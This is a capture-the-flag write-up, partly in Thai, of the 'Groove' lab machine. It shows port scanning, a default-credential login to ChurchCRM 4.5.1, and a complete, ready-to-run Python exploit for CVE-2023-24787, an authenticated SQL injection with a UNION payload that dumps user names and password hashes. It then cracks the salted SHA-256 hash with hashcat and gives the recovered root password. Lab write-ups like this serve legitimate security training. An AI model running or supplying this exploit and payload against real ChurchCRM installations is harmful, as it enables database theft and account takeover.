# Recon

## TCP Scan

```bash
sudo ../tools/scan.sh 192.168.245.44
[*] Running rustscan...
[*] Running nmap on ports: 22,80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 02:17 EDT
Nmap scan report for 192.168.245.44
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: ChurchCRM: Login
|_Requested resource was /session/begin
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.24 seconds
                                                                            
```

## TCP 80 

![[Challenge/ProvingGround/Groove/IMG/001.png]]

ตรวจสอบ Default Credential จะพบว่าใช้เป็น admin:changeme 
![[Challenge/ProvingGround/Groove/IMG/002.png]]

![[Challenge/ProvingGround/Groove/IMG/003.png]]

หากสำรวจจะพบว่าเป็นเวอร์ชัน 4.5.1 

# Exploit CVE-2023-24787 

ดำเนินการแก้ไข Script ให้สามารถใช้งานได้ 

```bash
# Exploit Title: ChurchCRM 4.5.1 - Authenticated SQL Injection
# Date: 11-03-2023 (Modified: 30-06-2025 by Gemini for auto-detecting cookie)
# Exploit Author: Arvandy
# Blog Post: https://github.com/arvandy/CVE/blob/main/CVE-2023-24787/CVE-2023-24787.md
# Software Link: https://github.com/ChurchCRM/CRM/releases
# Vendor Homepage: http://churchcrm.io/
# Version: 4.5.1
# Tested on: Windows, Linux
# CVE: CVE-2023-24787

"""
The endpoint /EventAttendance.php is vulnerable to Authenticated SQL Injection (Union-based and Blind-based) via the Event GET parameter.
This endpoint can be triggered through the following menu: Events - Event Attendance Reports - Church Service/Sunday School.
The Event Parameter is taken directly from the query string and passed into the SQL query without any sanitization or input escaping.
This allows the attacker to inject malicious Event payloads to execute the malicious SQL query.

This script is created as Proof of Concept to retrieve the username and password hash from user_usr table.
This version includes automatic detection of the session cookie name after successful login.
"""

import sys
import requests
from requests.exceptions import ConnectionError, Timeout, RequestException

def login(target, username, password):
    """
    Attempts to log in to the ChurchCRM application and automatically
    detects the session cookie name used by the application.
    Returns a tuple of (session_cookie_name, session_cookie_value) if successful,
    or (None, None) otherwise.
    """
    login_url = f"{target}/session/begin"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    data = f"User={username}&Password={password}"

    print(f"\n[DEBUG] Attempting to log in to: {login_url}")
    print(f"[DEBUG] Login data: User={username}&Password=********") # Mask password in debug output

    try:
        s = requests.Session()
        response = s.post(login_url, data=data, headers=headers, timeout=10, allow_redirects=True) # Allow redirects to capture final cookies

        print(f"[DEBUG] Login response status code: {response.status_code}")

        # Try to find a meaningful session cookie
        session_cookie_name = None
        session_cookie_value = None

        # Iterate through all cookies set by the session
        for cookie_name, cookie_value in s.cookies.items():
            # Heuristic: Look for cookies that are likely session IDs
            # Avoid common non-session cookies like 'PHPSESSID' if other more specific ones exist.
            # However, for ChurchCRM, PHPSESSID is often the actual session ID.
            if "session" in cookie_name.lower() or "crm" in cookie_name.lower() or "php" in cookie_name.lower():
                session_cookie_name = cookie_name
                session_cookie_value = cookie_value
                # In many cases, PHPSESSID is sufficient. We take the first one found as a best guess.
                # If multiple are found, this might need refinement.
                if "PHPSESSID" == cookie_name: # Prioritize PHPSESSID if present
                    break
                
        if session_cookie_name and session_cookie_value:
            print(f"[INFO] Successfully obtained session cookie.")
            print(f"[DEBUG] Detected Session Cookie Name: {session_cookie_name}")
            print(f"[DEBUG] Session Cookie Value: {session_cookie_value}")
            return session_cookie_name, session_cookie_value
        else:
            print(f"[ERROR] Login successful (Status {response.status_code}), but no suitable session cookie found.")
            print(f"[DEBUG] Full response headers: {response.headers}")
            print(f"[DEBUG] All cookies found: {s.cookies.items()}")
            print(f"[DEBUG] First 500 chars of response body: \n{response.text[:500]}")

    except ConnectionError:
        print(f"[CRITICAL] Connection error: Could not connect to {target}. Check target URL, IP, and network connectivity.")
    except Timeout:
        print(f"[CRITICAL] Timeout error: Connection to {target} timed out. Target might be slow or unreachable.")
    except RequestException as e:
        print(f"[CRITICAL] An unexpected request error occurred: {e}")
    except Exception as e:
        print(f"[CRITICAL] An unhandled error occurred during login: {e}")

    return None, None

def dump_user_table(target, session_cookie_name, session_cookie_value):
    """
    Exploits the SQL Injection to retrieve username and password hashes,
    using the dynamically detected session cookie.
    """
    if not session_cookie_name or not session_cookie_value:
        print("[ERROR] No valid session cookie found. Cannot proceed with SQL Injection.")
        return

    # The SQL Injection payload
    sql_payload = "2+UNION+ALL+SELECT+1,NULL,CONCAT('Perseverance',usr_Username,':',usr_Password),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+from+user_usr--+-"
    exploit_url = f"{target}/EventAttendance.php?Action=List&Event={sql_payload}&Type=Sunday School"
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': f'{session_cookie_name}={session_cookie_value}' # Use dynamic cookie name here
    }

    print(f"\n[DEBUG] Attempting SQL Injection at: {exploit_url}")
    print(f"[DEBUG] Request headers (with cookie): {headers}")

    try:
        response = requests.get(exploit_url, headers=headers, timeout=10)
        print(f"[DEBUG] SQL Injection response status code: {response.status_code}")
        print(f"[DEBUG] First 500 chars of response body: \n{response.text[:500]}")

        if response.status_code == 200:
            print("\n[INFO] Searching for extracted credentials...")
            found_users = False
            for line in response.text.splitlines():
                if "<td >Perseverance" in line:
                    try:
                        extracted_data = line.split("Perseverance")[1].split("</td>")[0].strip()
                        print(f"[SUCCESS] Found User:Password -> {extracted_data}")
                        found_users = True
                    except IndexError:
                        print(f"[WARNING] Found 'Perseverance' but failed to parse the line: {line.strip()[:100]}...")
            
            if not found_users:
                print("[INFO] 'Perseverance' marker not found in the response. This could mean:")
                print("       - The SQL Injection was not successful (e.g., patched, WAF, wrong payload).")
                print("       - The HTML structure has changed, and the script can't find the data (unlikely if ChurchCRM 4.5.1).")
                print("       - The database table 'user_usr' or columns 'usr_Username', 'usr_Password' do not exist or are named differently.")
        else:
            print(f"[ERROR] SQL Injection request failed with status code: {response.status_code}")
            print(f"[DEBUG] Full response body: \n{response.text}")

    except ConnectionError:
        print(f"[CRITICAL] Connection error during SQL Injection: Could not connect to {target}. Check target URL, IP, and network connectivity.")
    except Timeout:
        print(f"[CRITICAL] Timeout error during SQL Injection: Connection to {target} timed out.")
    except RequestException as e:
        print(f"[CRITICAL] An unexpected request error occurred during SQL Injection: {e}")
    except Exception as e:
        print(f"[CRITICAL] An unhandled error occurred during SQL Injection: {e}")

def main():
    """Main execution function."""
    print("-----------------------------------------------------")
    print("ChurchCRM 4.5.1 - Authenticated SQL Injection Exploit")
    print("-----------------------------------------------------")

    if len(sys.argv) != 4:
        print("\n[!] Usage: python3 51319.py <URL> <username> <password>")
        print("    Example: python3 51319.py http://192.168.1.100/ChurchCRM admin changeme")
        sys.exit(-1)

    target = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]

    print(f"\n[INFO] Target: {target}")
    print(f"[INFO] Username: {username}")
    print(f"[INFO] Password: {password}")

    # Attempt to log in and get the dynamically detected cookie
    session_cookie_name, session_cookie_value = login(target, username, password)

    if session_cookie_name and session_cookie_value:
        print("\n[INFO] Proceeding with SQL Injection...")
        dump_user_table(target, session_cookie_name, session_cookie_value)
    else:
        print("\n[CRITICAL] Aborting: Could not establish a valid session or detect session cookie.")

if __name__ == "__main__":
    main()
```


![[Challenge/ProvingGround/Groove/IMG/004.png]]


# Hash checker 

```bash
hashid hash  
--File 'hash'--
Analyzing '33b8fc76a24681b67a9431b632548d069336202bed5828fe431711a8e5b52d1b'
[+] Snefru-256 
[+] SHA-256 
[+] RIPEMD-256 
[+] Haval-256 
[+] GOST R 34.11-94 
[+] GOST CryptoPro S-Box 
[+] SHA3-256 
[+] Skein-256 
[+] Skein-512(256) 
--End of file 'hash'--                                                                                                                                                                                                                                            
hashcat -h | grep sha256
```

# Crack root password

```bash
cat hash    
33b8fc76a24681b67a9431b632548d069336202bed5828fe431711a8e5b52d1b:2
hashcat -m 1410 hash /usr/share/wordlist/rockyou.txt
```

การทดสอบแคร็กแฮช SHA-256 (หรือ SHA2-256) ด้วย Hashcat และพบกับความท้าทายที่น่าสนใจครับ ในตอนแรกคุณระบุว่าแฮชเป็น SHA2-256 และพยายามใช้ Hashcat แคร็ก แต่ก็ยังไม่สำเร็จ จึงลองเปลี่ยนไปใช้โหมด **SHA-256 แบบธรรมดา** ซึ่งเป็นพื้นฐานสำหรับแฮชที่มีความยาว 256 บิต แต่คราวนี้กลับได้รับข้อผิดพลาด **"Token length exception"**

เพื่อแก้ไขปัญหานี้ คุณได้ลองเพิ่ม `:2` ต่อท้ายแฮชที่คุณต้องการแคร็ก ซึ่งเป็นวิธีการที่ใช้ในการระบุรูปแบบเฉพาะของแฮชให้กับ Hashcat และเมื่อลองทำตามขั้นตอนนี้ การแคร็กแฮชด้วย Hashcat ในโหมด SHA-256 ก็ **ประสบความสำเร็จในที่สุด**

สรุปได้ว่า "Token length exception" เกิดขึ้นเมื่อ Hashcat ไม่เข้าใจรูปแบบของแฮชที่คุณให้มาอย่างสมบูรณ์ และการเพิ่ม `:2` เข้าไปนั้นเป็นการช่วยให้ Hashcat ตีความโครงสร้างของแฮชได้ถูกต้อง ทำให้กระบวนการแคร็กสามารถดำเนินต่อไปและสำเร็จได้ครับ

หลังจากการ Crack เราจะได้ข้อมูล 
![[Challenge/ProvingGround/Groove/IMG/005.png]]
`root:artistakeichelleko2007`

![[Challenge/ProvingGround/Groove/IMG/006.png]]


# PWN